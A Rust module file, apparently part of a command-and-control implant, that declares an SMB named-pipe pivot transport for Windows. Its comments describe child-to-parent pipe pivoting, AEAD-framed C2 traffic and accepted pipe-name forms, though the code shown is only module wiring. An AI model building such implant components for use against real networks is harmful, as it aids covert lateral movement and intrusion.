//! SMB named-pipe pivot transport.
//!
//! Replaces `transport_smb_windows.go` + `transport_smb_other.go`.
//! The child dials a named pipe the parent is listening on and
//! runs the peer-to-peer pivot handshake over it. Every C2 request
//! travels as one AEAD frame over the pipe; the child's own wire
//! envelope (if enabled) is carried opaquely inside that frame.
//!
//! # Three pipe-name forms
//!
//! - Bare name (`tornado_relay_001`) → `\\.\pipe\tornado_relay_001`
//! - Local path (`\\.\pipe\tornado_relay_001`) → unchanged
//! - UNC path (`\\WIN-SRV2\pipe\tornado_relay_001`) → unchanged
//!
//! A UNC path without `\pipe\` is rejected at construction — the
//! `CreateFile` call would fail with `ERROR_BAD_PATHNAME`, which is
//! indistinguishable from a typo'd hostname at the operator's
//! console.
//!
//! # Windows-only
//!
//! `SmbTransport::new` returns an error on every non-Windows
//! target. The trait is implemented on both platforms so the crate
//! compiles; the error at construction is what the operator sees.

#[cfg(target_os = "windows")]
mod windows;
#[cfg(target_os = "windows")]
pub use windows::SmbTransport;

#[cfg(not(target_os = "windows"))]
mod other;
#[cfg(not(target_os = "windows"))]
pub use other::SmbTransport;